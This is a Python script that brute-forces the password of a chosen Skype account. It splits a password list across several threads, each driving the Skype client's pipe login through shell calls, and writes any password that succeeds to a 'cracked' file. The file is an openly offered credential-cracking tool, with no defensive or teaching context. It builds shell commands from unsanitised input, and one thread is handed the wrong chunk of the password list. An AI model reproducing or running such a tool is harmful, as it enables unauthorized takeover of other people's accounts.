import os
import mechanize
import random
import threading
import time
#script -c "echo venamteam mypasshere | skype --pipelogin" log

############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################

nomore = False

realpass = ""
def randomname():
    name = ""
    for a in xrange(4):
        name+=random.choice('logsz')
    return name


def cracker(user,passlist,thready):
    global nomore
    global realpass

    filename = randomname()
    for passwd in passlist:
        passwd = passwd.replace("\n","").replace("\r","")
        os.system('script -c "echo '+user+' '+passwd+' | skype'+thready+' --pipelogin" '+filename)
        time.sleep(3)
        myfile = open(filename,'r').read()
        if "Incorrect Password" in myfile:
            pass
        else:
            nomore = True
            realpass = passwd
            os.system("killall skype")
            os.system("echo "+user+":"+realpass+">>cracked")
            exit(0)



user = raw_input("user you want to crack the skype:\n=> ")
passlist = open(raw_input("passlist:\n=> ")).readlines()
nbthreads = input("Entere the nb threads:\n=> ")

#skype --dbpath=./.Skype2
if nbthreads == 1 :
    z = chunkIt(passlist, nbthreads)
    threading.Thread(target=cracker, args=(user,z[0]," --dbpath=./.Skypy")).start()
if nbthreads == 2 :
    z = chunkIt(passlist, nbthreads)
    threading.Thread(target=cracker, args=(user,z[0]," --dbpath=./.Skypy")).start()
    threading.Thread(target=cracker, args=(user,z[1]," --dbpath=./.Skype1")).start()
if nbthreads == 3 :
    z = chunkIt(passlist, nbthreads)
    threading.Thread(target=cracker, args=(user,z[0]," --dbpath=./.Skypy")).start()
    threading.Thread(target=cracker, args=(user,z[1]," --dbpath=./.Skype1")).start()
    threading.Thread(target=cracker, args=(user,z[1]," --dbpath=./.Skype2")).start()

